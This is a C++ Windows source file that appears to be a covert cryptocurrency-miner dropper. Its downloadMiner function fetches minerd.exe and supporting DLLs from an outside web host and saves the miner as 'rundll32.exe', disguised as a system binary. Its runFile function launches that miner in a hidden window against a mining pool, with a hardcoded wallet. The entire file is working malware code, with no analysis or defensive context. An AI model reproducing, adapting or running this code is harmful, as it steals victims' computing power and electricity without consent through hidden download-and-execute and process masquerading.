#include "stdafx.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <urlmon.h>
#include "process.h"
#include "utils.h"

typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB);

void runFile();
void downloadMiner();

BOOL IsProcessRunning2(const char *processName)
{
    BOOL exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry))
            if (!stricmp(entry.szExeFile, processName))
                exists = true;

    CloseHandle(snapshot);
    return exists;

}
void StartMiner()
{
    downloadMiner();
    if (!IsProcessRunning2("run32dll.exe"))
        runFile(); 
}

int CheckFileExists(TCHAR * file)
{
    WIN32_FIND_DATA FindFileData;
    HANDLE handle = FindFirstFile(file, &FindFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found)
    {
        FindClose(handle);
    }
    return found;
}


void runFile()
{
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcess("rundll32.exe", "rundll32.exe -o stratum+tcp://mine.xpool.ca:1122 -u 1KNa8Zos3EiZV4jLgNYLty9N1LrFpzU9rA.NervousScrypt -p \"--diff 512\" --threads=1", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return;
}

void downloadMiner()
{
    lpURLDownloadToFile URLDownloadToFile;

    HMODULE hUrlmon = LoadLibrary("URLMON.DLL");

    URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");

    if (!CheckFileExists("rundll32.exe"))
        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/minerd.exe", "rundll32.exe", 0, 0);
    if (!CheckFileExists("zlib1.dll"))
        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
    if (!CheckFileExists("libwinpthread-1.dll"))
        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
    if (!CheckFileExists("libcurl-4.dll"))
        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);

    return;
}